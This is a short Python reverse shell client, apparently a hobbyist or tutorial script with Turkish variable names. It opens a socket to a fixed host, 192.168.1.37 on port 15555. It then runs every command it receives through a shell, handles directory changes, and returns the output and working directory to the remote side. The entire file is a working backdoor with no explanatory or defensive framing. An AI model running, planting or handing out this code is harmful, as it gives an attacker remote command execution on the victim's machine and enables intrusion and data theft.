import socket
import os
import subprocess

s=socket.socket()

s.connect(("192.168.1.37",15555))

while True:
    veri=s.recv(1024)

    if veri[:2].decode("utf-8") =="cd":

        try:
            os.chdir(veri[3:].decode("utf-8"))
            s.send(os.getcwd().encode("utf-8"))

        except FileNotFoundError:

            s.send("Dosya Bulunamadı...".encode("utf-8"))

    else:
        if len(veri)>0:

            cmd=subprocess.Popen(veri.decode("utf-8"),shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)

            output=cmd.stdout.read()+cmd.stderr.read()

            output_str=str(output,encoding="cp857")

            konum=os.getcwd()

            s.send(str.encode(output_str+"\n"+konum,encoding="utf-8"))

